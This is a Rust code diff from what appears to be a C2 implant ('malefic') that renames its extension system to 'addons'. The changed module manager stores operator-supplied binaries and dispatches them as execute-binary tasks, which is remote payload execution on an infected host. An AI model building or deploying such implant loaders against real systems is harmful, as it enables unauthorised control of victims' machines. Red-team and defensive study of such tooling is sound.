@@ -2,7 +2,7 @@ use std::collections::HashMap;
 use malefic_helper::common::hot_modules;
 use malefic_helper::debug;
 use malefic_helper::protobuf::implantpb;
-use malefic_helper::protobuf::implantpb::{Extension, Spite};
+use malefic_helper::protobuf::implantpb::{Addon, Spite};
 use malefic_helper::protobuf::implantpb::spite::Body;
 use modules::{check_field, MaleficModule};
 use crate::check_body;
@@ -12,7 +12,7 @@ use crate::common::error::MaleficError;
 type ModuleRegister = extern "C" fn () -> HashMap<String, Box<MaleficModule>>;
 type ModuleMap = HashMap<String, Box<MaleficModule>>;
 
-pub struct MaleficExtension {
+pub struct MaleficAddon {
     name: String,
     r#type: String,
     depend: String,
@@ -22,26 +22,30 @@ pub struct MaleficExtension {
 pub struct MaleficManager {
     bundles: HashMap<String, ModuleRegister>,
     pub(crate) modules: Box<ModuleMap>,
-    extensions: HashMap<String, Box<MaleficExtension>>
+    addons: HashMap<String, Box<MaleficAddon>>
 }
 
 impl MaleficManager{
     pub(crate) fn new() -> Self {
-        let mut bundles = HashMap::new();
-        bundles.insert("origin".to_string(), modules::register_modules as ModuleRegister);
         MaleficManager {
-            bundles,
+            bundles: HashMap::new(),
             modules: Box::new(HashMap::new()),
-            extensions: HashMap::new()
+            addons: HashMap::new()
         }
     }
 
     pub(crate) fn clean(&mut self) {
         self.modules.clear();
-        self.extensions.clear();
+        self.addons.clear();
     }
 
     pub(crate) fn refresh(&mut self) -> Result<(), MaleficError> {
+        self.bundles.clear();
+        self.bundles.insert("origin".to_string(), modules::register_modules as ModuleRegister);
+        self.reload()
+    }
+
+    fn reload(&mut self) -> Result<(), MaleficError> {
         for (name, bundle) in self.bundles.iter() {
             let bundle_modules = bundle();
             debug!("refresh module: {} {:?}", name, bundle_modules.keys());
@@ -51,7 +55,6 @@ impl MaleficManager{
         }
         Ok(())
     }
-
     pub(crate) fn load_module(&mut self, spite: Spite) -> Result<(), MaleficError> {
         // let body = spite.body.ok_or_else(|| MaleficError::MissBody)?;
         let module = check_body!(spite, Body::LoadModule)?;
@@ -89,48 +92,48 @@ impl MaleficManager{
         self.modules.get(name)
     }
 
-    fn get_extension(&self, name: &String) -> Option<&Box::<MaleficExtension>> {
-        self.extensions.get(name)
+    fn get_addon(&self, name: &String) -> Option<&Box::<MaleficAddon>> {
+        self.addons.get(name)
     }
 
-    pub(crate) fn list_extension(&self) -> Vec<Extension> {
-        let mut extensions = Vec::new();
-        for (name, module) in self.extensions.iter() {
-            extensions.push(implantpb::Extension{
+    pub(crate) fn list_addon(&self) -> Vec<Addon> {
+        let mut addons = Vec::new();
+        for (name, module) in self.addons.iter() {
+            addons.push(implantpb::Addon{
                 name: name.clone(),
                 r#type: module.r#type.clone(),
                 depend: module.depend.clone(),
             })
         }
-        extensions
+        addons
     }
 
-    pub(crate) fn load_extension(&mut self, spite: Spite) -> Result<(), MaleficError> {
+    pub(crate) fn load_addon(&mut self, spite: Spite) -> Result<(), MaleficError> {
         // let body = spite.body.ok_or_else(|| MaleficError::MissBody)?;
-        let ext = check_body!(spite, Body::LoadExtension)?;
+        let ext = check_body!(spite, Body::LoadAddon)?;
 
-        let extension = MaleficExtension{
+        let addon = MaleficAddon {
             name: check_field!(ext.name)?,
             r#type: ext.r#type,
             depend: check_field!(ext.depend)?,
             content: check_field!(ext.bin)?,
         };
-        self.extensions.insert(extension.name.clone(), Box::new(extension));
+        self.addons.insert(addon.name.clone(), Box::new(addon));
         Ok(())
     }
 
-    pub(crate) fn execute_extension(&self, spite: Spite) -> Result<Spite, MaleficError> {
-        let ext = check_body!(spite, Body::ExecuteExtension)?;
+    pub(crate) fn execute_addon(&self, spite: Spite) -> Result<Spite, MaleficError> {
+        let ext = check_body!(spite, Body::ExecuteAddon)?;
 
-        let extension = self.get_extension(&check_field!(ext.extension)?).ok_or_else(|| MaleficError::ExtensionNotFound)?;
-        if self.get_module(&extension.depend).is_none() {
+        let addon = self.get_addon(&check_field!(ext.addon)?).ok_or_else(|| MaleficError::AddonNotFound)?;
+        if self.get_module(&addon.depend).is_none() {
             return Err(MaleficError::ModuleNotFound);
         }
 
         let mut execute_binary = ext.execute_binary.clone().unwrap();
-        execute_binary.bin = extension.content.clone();
-        execute_binary.name = extension.name.clone();
-        let result = new_spite(spite.task_id, extension.depend.clone(), Body::ExecuteBinary(execute_binary));
+        execute_binary.bin = addon.content.clone();
+        execute_binary.name = addon.name.clone();
+        let result = new_spite(spite.task_id, addon.depend.clone(), Body::ExecuteBinary(execute_binary));
 
         Ok(result)
     }
